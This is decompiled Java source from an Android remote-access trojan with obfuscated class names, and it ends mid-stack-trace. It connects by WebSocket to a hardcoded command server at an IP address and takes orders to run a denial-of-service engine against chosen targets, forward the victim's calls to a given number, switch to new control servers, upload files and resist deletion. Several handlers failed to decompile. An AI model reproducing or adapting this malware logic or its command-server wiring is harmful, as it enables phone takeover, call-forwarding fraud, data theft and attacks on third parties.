/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Point
 *  android.media.MediaMetadataRetriever
 *  android.media.MediaPlayer
 *  android.net.Uri
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.util.Base64
 *  android.view.WindowManager
 *  android.widget.Toast
 *  okhttp3.OkHttpClient
 *  okhttp3.OkHttpClient$Builder
 *  okhttp3.Request
 *  okhttp3.Request$Builder
 *  okhttp3.Response
 *  okhttp3.WebSocket
 *  okhttp3.WebSocketListener
 *  org.json.JSONArray
 *  org.json.JSONException
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.media.MediaMetadataRetriever;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import android.view.WindowManager;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.Serializable;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.zip.ZipInputStream;
import linker.resourcer.encoder.AppDataManager;
import linker.resourcer.encoder.CShell;
import linker.resourcer.encoder.CommandProcessor;
import linker.resourcer.encoder.DOSEngine;
import linker.resourcer.encoder.IRemoteShell;
import linker.resourcer.encoder.Toastit;
import linker.resourcer.encoder.Tools;
import linker.resourcer.encoder.Vupzturl;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.callForwardingUtility;
import linker.resourcer.encoder.elwxjqxcxhcpntga;
import linker.resourcer.encoder.etkmbyodxlwuglfdj$1$$ExternalSyntheticLambda3;
import linker.resourcer.encoder.etkmbyodxlwuglfdj$3$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.jcavdzvncdstlcwvoszkepac;
import linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva;
import linker.resourcer.encoder.khkpbnqozqiffemrwsat;
import linker.resourcer.encoder.lmqhtifjzrtsgjcqpakvh;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.maagohqzehyoivaxlfkohrpeu;
import linker.resourcer.encoder.tcmypqsdhypcqijjdbpwgzrivmu;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;
import linker.resourcer.encoder.yzwfammsheivqmaemonkhmjao;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class etkmbyodxlwuglfdj {
    public static Context Dummyctx;
    private static PowerManager.WakeLock LOCK_SOCKET;
    public static CShell btshell;
    private static OkHttpClient client;
    public static boolean isConnected;
    private static volatile etkmbyodxlwuglfdj singinst;
    private static WebSocket ws;
    private boolean isended = false;
    private final ConcurrentHashMap<String, WebSocket> openSockets = new ConcurrentHashMap();

    static {
        singinst = null;
        isConnected = false;
    }

    private etkmbyodxlwuglfdj(Context context) {
        Dummyctx = context.getApplicationContext();
    }

    private void Endme() {
        if (this.isended) {
            return;
        }
        this.isended = true;
        isConnected = false;
        vyklwirattpkwkqagsbrm.WriteBool(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.Send_Skilton, false);
        this.closesocket();
        try {
            if (LOCK_SOCKET != null && LOCK_SOCKET.isHeld()) {
                LOCK_SOCKET.release();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ PowerManager.WakeLock access$102(PowerManager.WakeLock wakeLock) {
        LOCK_SOCKET = wakeLock;
        return wakeLock;
    }

    static /* synthetic */ void access$200(etkmbyodxlwuglfdj etkmbyodxlwuglfdj2, Context context, String string2, String string3) {
        etkmbyodxlwuglfdj2.writeOptionBool(context, string2, string3);
    }

    private void closesocket() {
        try {
            if (ws != null) {
                ws.close(1000, null);
                ws = null;
            }
            if (client != null) {
                client.dispatcher().cancelAll();
                client.connectionPool().evictAll();
                client.dispatcher().executorService().shutdown();
                client = null;
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    private String createMessage(Context object, String string2, String string3, String string4) throws Exception {
        String string5 = vyklwirattpkwkqagsbrm.Read(object, "ID", "Deviceid");
        object = vyklwirattpkwkqagsbrm.Read(object, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, "null");
        if (string5 != null && string2 != null) {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("idf", (Object)string2);
            jSONObject.put("pid", (Object)string5);
            jSONObject.put("itype", (Object)"Slr_client");
            jSONObject.put("subc", (Object)"msg");
            jSONObject.put("msg", (Object)string3);
            jSONObject.put("cip", object);
            jSONObject.put("conk", (Object)string4);
            return jSONObject.toString();
        }
        throw new Exception("Invalid parameters for message creation");
    }

    private boolean handleResponse(String string2) {
        if (string2 != null) {
            maagohqzehyoivaxlfkohrpeu.Debug("ServerSay:", string2);
            if (string2.startsWith("Conf:")) {
                String string3;
                JSONObject jSONObject;
                block11: {
                    string2 = string2.replace("Conf:", "");
                    jSONObject = new JSONObject(string2);
                    string3 = jSONObject.optString("idf", "null");
                    if (!string3.equals("null")) break block11;
                    return false;
                }
                try {
                    CharSequence charSequence;
                    String string4 = jSONObject.optString("cip", ffbrxjknfnpfxahr.getExternalIpAddress());
                    string2 = vyklwirattpkwkqagsbrm.Read(Dummyctx, "red_ip", "");
                    if (string2.length() > 0) {
                        charSequence = new StringBuilder();
                        charSequence = charSequence.append("ws://").append(string2).append(":8080/<").toString();
                    } else {
                        charSequence = jSONObject.optString("sk", "ws://195.160.221.203:8080/<");
                        string2 = jSONObject.optString("ad", "195.160.221.203");
                    }
                    aaskrfyvhoypymnzlskbzwpyr.Sockets_Servers = charSequence;
                    aaskrfyvhoypymnzlskbzwpyr.Server_Address = string2;
                    vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.THE_IDF, string3);
                    vyklwirattpkwkqagsbrm.Write(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, string4);
                    maagohqzehyoivaxlfkohrpeu.Debug("authers (idf):", string3);
                    this.startwocket();
                    return true;
                }
                catch (JSONException jSONException) {
                    maagohqzehyoivaxlfkohrpeu.Error("Options phone", jSONException.getMessage());
                }
            } else if (string2.startsWith("CO:")) {
                if (string2.endsWith(":Sleep")) {
                    lqvpqwmhpvnnlhskxyjdwphzvsl.needsleep = true;
                    this.Endme();
                }
            } else {
                lqvpqwmhpvnnlhskxyjdwphzvsl.needsleep = true;
                this.Endme();
            }
        }
        return false;
    }

    public static etkmbyodxlwuglfdj instance(Context context) {
        if (singinst != null) {
            return singinst;
        }
        singinst = new etkmbyodxlwuglfdj(context);
        return singinst;
    }

    static /* synthetic */ void lambda$HandelPacket$0() {
        Dummyctx.startService(jcavdzvncdstlcwvoszkepac.getRestartIntent(Dummyctx));
    }

    static /* synthetic */ void lambda$HandelPacket$1() {
        try {
            Thread.sleep(5000L);
        }
        catch (InterruptedException interruptedException) {
            interruptedException.printStackTrace();
        }
        jhvbzpdwpbqgticwdxuva.PreventDelete = true;
        jhvbzpdwpbqgticwdxuva.forbattery = false;
    }

    static /* synthetic */ void lambda$HandelPacket$2() {
        try {
            Thread.sleep(5000L);
        }
        catch (InterruptedException interruptedException) {
            interruptedException.printStackTrace();
        }
        jhvbzpdwpbqgticwdxuva.PreventDelete = true;
        jhvbzpdwpbqgticwdxuva.FOR_EXTR_STRG = false;
    }

    static /* synthetic */ void lambda$HandelPacket$3() {
        try {
            Thread.sleep(5000L);
        }
        catch (InterruptedException interruptedException) {
            interruptedException.printStackTrace();
        }
        jhvbzpdwpbqgticwdxuva.PreventDelete = true;
        jhvbzpdwpbqgticwdxuva.FOR_DRAW_OVER = false;
    }

    private void startLiveDownload(Context context, String string2, String string3, String string4, Boolean bl, OkHttpClient okHttpClient, UploadState uploadState) {
        okHttpClient.newWebSocket(new Request.Builder().url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build(), new WebSocketListener(this, context, string2, uploadState, string4, string3, bl, okHttpClient){
            private volatile boolean isconnected;
            final etkmbyodxlwuglfdj this$0;
            final Boolean val$clearit;
            final OkHttpClient val$clientfile;
            final Context val$ctx;
            final String val$filePath;
            final String val$originalpath;
            final String val$sockidf;
            final UploadState val$state;
            {
                this.this$0 = etkmbyodxlwuglfdj2;
                this.val$ctx = context;
                this.val$filePath = string2;
                this.val$state = uploadState;
                this.val$originalpath = string3;
                this.val$sockidf = string4;
                this.val$clearit = bl;
                this.val$clientfile = okHttpClient;
                this.isconnected = false;
            }

            static /* synthetic */ boolean access$700(4 var0) {
                return var0.isconnected;
            }

            static /* synthetic */ boolean access$702(4 var0, boolean bl) {
                var0.isconnected = bl;
                return bl;
            }

            private void handleRetry() {
                if (this.val$state.finished) {
                    return;
                }
                if (this.val$state.retryCount >= 3) {
                    maagohqzehyoivaxlfkohrpeu.Debug("uploading:", "Giving up after " + this.val$state.retryCount + " retries");
                    this.val$clientfile.dispatcher().executorService().shutdown();
                    return;
                }
                UploadState uploadState = this.val$state;
                ++uploadState.retryCount;
                maagohqzehyoivaxlfkohrpeu.Debug("uploading:", "Retry " + this.val$state.retryCount + " from byte " + this.val$state.lastSentSize + " (chunk " + this.val$state.chunkNumber + ")");
                try {
                    Thread.sleep(1000L);
                }
                catch (InterruptedException interruptedException) {
                    // empty catch block
                }
                this.this$0.startLiveDownload(this.val$ctx, this.val$filePath, this.val$sockidf, this.val$originalpath, this.val$clearit, this.val$clientfile, this.val$state);
            }

            public void onClosed(WebSocket webSocket, int n, String string2) {
                this.isconnected = false;
                if (this.val$state.finished) {
                    this.val$clientfile.dispatcher().executorService().shutdown();
                    return;
                }
                this.handleRetry();
            }

            public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                this.isconnected = false;
                throwable.printStackTrace();
                if (this.val$state.finished) {
                    this.val$clientfile.dispatcher().executorService().shutdown();
                    return;
                }
                this.handleRetry();
            }

            public void onMessage(WebSocket webSocket, String string2) {
                super.onMessage(webSocket, string2);
                try {
                    JSONObject jSONObject = new JSONObject(string2);
                    string2 = jSONObject.optString("type", "empty");
                    if (string2.equals("stop") || string2.equals("Unauthorized access")) {
                        this.val$state.finished = true;
                        this.isconnected = false;
                        this.val$clientfile.dispatcher().executorService().shutdown();
                        webSocket.close(1000, "Server stop");
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }

            public void onOpen(WebSocket webSocket, Response response) {
                this.isconnected = true;
                new Thread(this, webSocket){
                    final 4 this$1;
                    final WebSocket val$webSocketf;
                    {
                        this.this$1 = var1_1;
                        this.val$webSocketf = webSocket;
                    }

                    /*
                     * Exception decompiling
                     */
                    @Override
                    public void run() {
                        /*
                         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                         * 
                         * org.benf.cfr.reader.util.ConfusedCFRException: Back jump on a try block [egrp 78[TRYBLOCK] [152 : 1916->1921)] java.lang.Throwable
                         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.insertExceptionBlocks(Op02WithProcessedDataAndRefs.java:2283)
                         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:415)
                         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                         *     at org.benf.cfr.reader.Main.main(Main.java:54)
                         */
                        throw new IllegalStateException("Decompilation failed");
                    }
                }.start();
            }
        });
    }

    private void startwocket() {
        OkHttpClient.Builder builder;
        if (isConnected) {
            return;
        }
        try {
            builder = new OkHttpClient.Builder();
            client = builder.build();
            builder = new Request.Builder();
            builder = builder.url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build();
        }
        catch (Exception exception) {
            client = null;
            return;
        }
        ws = client.newWebSocket((Request)builder, new WebSocketListener(this){
            private IRemoteShell btNetworkShell;
            private final Map<String, Long> chunkProgress;
            private final Map<String, List<byte[]>> chunkStorage;
            final etkmbyodxlwuglfdj this$0;
            {
                this.this$0 = etkmbyodxlwuglfdj2;
                this.chunkStorage = new HashMap<String, List<byte[]>>();
                this.chunkProgress = new HashMap<String, Long>();
            }

            /*
             * WARNING - void declaration
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            private void HandDDS(JSONObject object) {
                String string2;
                block8: {
                    try {
                        string2 = object.optString("tstate", "null");
                        boolean bl = string2.equals("0");
                        if (bl) {
                            if (DOSEngine.isEngineRunning()) {
                                DOSEngine.getInstance().stop();
                                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(Dummyctx, "Dos Engine", "Engine Stopped");
                                return;
                            }
                            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(Dummyctx, "Dos Engine", "Engine not active");
                            return;
                        }
                        if (string2.equals("1")) {
                            if (DOSEngine.isEngineRunning()) {
                                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(Dummyctx, "Dos Engine", "Engine already active");
                                return;
                            }
                            string2 = object.optString("turl", "0");
                            String string3 = object.optString("tport", "0");
                            String string4 = object.optString("ttype", "0");
                            DOSEngine.getInstance().start(string4, string2, string3);
                            return;
                        }
                        if (!string2.equals("2")) return;
                        String string5 = "Not Active";
                        if (!DOSEngine.isEngineRunning()) break block8;
                        String string6 = "Active";
                    }
                    catch (Exception exception) {
                        maagohqzehyoivaxlfkohrpeu.Error("HandDDS", exception.getMessage());
                        return;
                    }
                }
                try {
                    void var1_5;
                    string2 = new JSONObject();
                    string2.put("type", (Object)"dos");
                    string2.put("cuz", (Object)"l");
                    string2.put("stt", (Object)var1_5);
                    string2.put("crtr", (Object)DOSEngine.CurrentTarget);
                    string2.put("crty", (Object)DOSEngine.Activetype);
                    String string7 = string2.toString();
                    this.this$0.Livemessage(Dummyctx, string7);
                    return;
                }
                catch (Exception exception) {
                    return;
                }
            }

            private void HandRedirect(JSONObject object) {
                try {
                    String string2 = object.optString("relink", "0");
                    String string3 = object.optString("reip", "0");
                    object = object.optString("rckey", "0");
                    if (!string2.equals("0") && !string3.equals("0")) {
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, "red_e", string2);
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, "red_ip", string3);
                        vyklwirattpkwkqagsbrm.Write(Dummyctx, "red_k", (String)object);
                        lqvpqwmhpvnnlhskxyjdwphzvsl.needsleep = true;
                        aaskrfyvhoypymnzlskbzwpyr.last_accepted_ping = null;
                        aaskrfyvhoypymnzlskbzwpyr.last_accepted_sk = null;
                        this.this$0.Endme();
                    }
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("HandRedirect", exception.getMessage());
                }
            }

            /*
             * Exception decompiling
             */
            private void HandleBlocker(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [20[CASE]], but top level block is 5[TRYBLOCK]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleBot(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [2[TRYBLOCK]], but top level block is 8[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleBrowser(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [45[CASE]], but top level block is 12[TRYBLOCK]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            private void HandleCallford(JSONObject object) {
                try {
                    String string2 = object.optString("cfstate", "0");
                    String string3 = object.optString("extrs", "0");
                    callForwardingUtility callForwardingUtility2 = new callForwardingUtility(Dummyctx);
                    if (string2.equals("0")) {
                        callForwardingUtility2.isCallForwardingActive(Integer.valueOf(string3));
                    } else if (string2.equals("1")) {
                        if (((String)(object = object.optString("numb", "0"))).equals("0")) {
                            return;
                        }
                        callForwardingUtility2.forwardCall((String)object, Integer.valueOf(string3));
                    } else if (string2.equals("2")) {
                        callForwardingUtility2.deactivateCallForwarding(Integer.valueOf(string3));
                    }
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("HandleUpdate", exception.getMessage());
                }
            }

            /*
             * Exception decompiling
             */
            private void HandleClone(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [2[TRYBLOCK]], but top level block is 31[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleFetch(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 4[SWITCH]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleFiles(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Started 2 blocks at once
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.getStartingBlocks(Op04StructuredStatement.java:412)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:487)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            /*
             * Exception decompiling
             */
            private void HandleLocation(JSONObject var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [12[CASE]], but top level block is 4[TRYBLOCK]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
